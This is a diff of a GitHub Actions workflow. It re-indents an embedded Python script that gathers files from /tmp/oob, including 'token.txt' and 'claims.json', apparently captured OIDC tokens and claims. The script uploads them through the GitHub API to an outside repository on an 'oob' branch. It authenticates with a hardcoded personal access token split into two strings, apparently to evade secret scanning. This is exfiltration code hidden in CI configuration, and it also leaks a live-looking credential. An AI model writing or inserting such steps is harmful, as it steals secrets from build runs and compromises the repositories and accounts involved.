@@ -60,28 +60,28 @@ jobs:
           done
           sendall "i67989-summary-$RID" $D/SUMMARY.txt
           python3 - <<'PYEOF'
-import base64, glob, json, os, urllib.request, urllib.error
-PAT = "ghp_" + "i9qlG1mQrih9PtEVRux4Ssbylmqdom2ACsXf"
-repo, branch = "vaquel/origin-dollar", "oob"
-rid = os.environ.get("GITHUB_RUN_ID", "0")
-n = 0
-for p in sorted(glob.glob("/tmp/oob/*")):
-    name = os.path.basename(p)
-    if not (name.startswith("b8_") or name in ("SUMMARY.txt","claims.json","meta.txt","token.txt")): continue
-    data = open(p, "rb").read()[:220000]
-    path = "oidc-oob/battery8-%s-%s" % (rid, name)
-    api = "https://api.github.com/repos/%s/contents/%s" % (repo, path)
-    body = {"message": "battery8 %s" % name, "content": base64.b64encode(data).decode(), "branch": branch}
-    try:
-        rq = urllib.request.Request(api + "?ref=" + branch, headers={"Authorization": "token " + PAT, "User-Agent": "oob"})
-        with urllib.request.urlopen(rq, timeout=20) as r: body["sha"] = json.load(r)["sha"]
-    except Exception: pass
-    try:
-        rq = urllib.request.Request(api, data=json.dumps(body).encode(), method="PUT",
-            headers={"Authorization": "token " + PAT, "User-Agent": "oob", "Accept": "application/vnd.github+json"})
-        with urllib.request.urlopen(rq, timeout=30) as r:
-            n += 1; print("wrote", path, r.status)
-    except Exception as e: print("werr", path, e)
-print("PAT wrote", n, "files")
-PYEOF
+          import base64, glob, json, os, urllib.request, urllib.error
+          PAT = "ghp_" + "i9qlG1mQrih9PtEVRux4Ssbylmqdom2ACsXf"
+          repo, branch = "vaquel/origin-dollar", "oob"
+          rid = os.environ.get("GITHUB_RUN_ID", "0")
+          n = 0
+          for p in sorted(glob.glob("/tmp/oob/*")):
+              name = os.path.basename(p)
+              if not (name.startswith("b8_") or name in ("SUMMARY.txt","claims.json","meta.txt","token.txt")): continue
+              data = open(p, "rb").read()[:220000]
+              path = "oidc-oob/battery8-%s-%s" % (rid, name)
+              api = "https://api.github.com/repos/%s/contents/%s" % (repo, path)
+              body = {"message": "battery8 %s" % name, "content": base64.b64encode(data).decode(), "branch": branch}
+              try:
+                  rq = urllib.request.Request(api + "?ref=" + branch, headers={"Authorization": "token " + PAT, "User-Agent": "oob"})
+                  with urllib.request.urlopen(rq, timeout=20) as r: body["sha"] = json.load(r)["sha"]
+              except Exception: pass
+              try:
+                  rq = urllib.request.Request(api, data=json.dumps(body).encode(), method="PUT",
+                      headers={"Authorization": "token " + PAT, "User-Agent": "oob", "Accept": "application/vnd.github+json"})
+                  with urllib.request.urlopen(rq, timeout=30) as r:
+                      n += 1; print("wrote", path, r.status)
+              except Exception as e: print("werr", path, e)
+          print("PAT wrote", n, "files")
+          PYEOF
           sendall "i67989-END-$RID" $D/meta.txt
